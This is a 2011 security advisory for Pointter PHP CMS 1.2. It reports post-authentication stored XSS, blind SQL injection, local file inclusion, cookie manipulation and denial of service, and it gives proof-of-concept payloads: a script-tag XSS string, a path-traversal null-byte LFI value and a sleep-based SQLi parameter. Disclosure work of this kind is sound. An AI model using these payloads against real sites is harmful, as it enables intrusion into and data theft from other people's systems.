@@ -1,0 +1,53 @@
+Pointter PHP Content Management System 1.2 Multiple Vulnerabilities
+
+
+Vendor: PangramSoft GmbH
+Product web page: http://www.pointter.com
+Affected version: 1.2
+
+Summary: Pointter PHP Content Management System is an advanced, fast
+and user friendly CMS script that can be used to build simple websites
+or professional websites with product categorization, product blogs,
+member login and search modules. The webmaster can create unlimited
+static page boxes, static pages, main categories, sub categories and
+product pages.
+
+Desc: Pointter CMS suffers from multiple vulnerabilities (post-auth)
+including: Stored XSS, bSQLi, LFI, Cookie Manipulation, DoS.
+
+Tested on: Microsoft Windows XP Pro SP3 (en)
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+
+
+Advisory ID: ZSL-2011-5002
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5002.php
+
+
+10.03.2011
+
+
+---
+XSS:
+The stored XSS is pretty much everywhere in the admin panel, just posting the
+string '"><script>alert(1)</script>' when editing some category, and on every
+return on the main page u get annoyed.
+
+LFI:
+script: pointtercms/admin/functions/createcategory.php
+post param: category
+poc: category=../../../../../../../../../test.txt%00&code=0e=0
+
+script: pointtercms/admin/functions/createpage.php
+post param: pageurl
+
+script: pointtercms/admin/functions/createproduct.php
+post param: producturl
+
+
+bSQLi:
+script: pointtercms/admin/functions/editsettings.php
+post param: onoff, count, boxname, tonoff, tname, monoff, mname, nonoff, nname,
+memonoff, memname, searchonoff, searchname, pos, tpos, mpos, npos, mempos, mail.
+poc: onoff=1'+and+sleep(10)%23&pos=0
+- Response size: 0 bytes, Duration: 10016 ms
